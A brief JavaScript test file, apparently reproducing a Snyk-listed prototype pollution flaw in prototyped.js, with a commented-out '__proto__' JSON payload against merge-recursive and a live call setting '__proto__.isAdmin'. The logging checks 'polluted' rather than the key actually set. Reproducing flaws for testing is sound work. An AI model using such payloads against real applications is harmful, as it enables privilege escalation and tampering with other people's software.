//https://snyk.io/vuln/SNYK-JS-PROTOTYPEDJS-1069824
test("prototype pollution in merge-recursive", () => {
  // const merge = require("merge-recursive").recursive;
  // const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
  // obj = {};

  // expect({}.polluted).toBe(undefined);

  // merge({}, JSON.parse(malicious_payload));

  // expect({}.polluted).toBe("yes");

  const set = require("prototyped.js/dist/object/set").default;
  console.log("Prototype before set", {}.polluted);
  set({}, "__proto__.isAdmin", true);
  console.log("Prototype after set", {}.polluted);
});
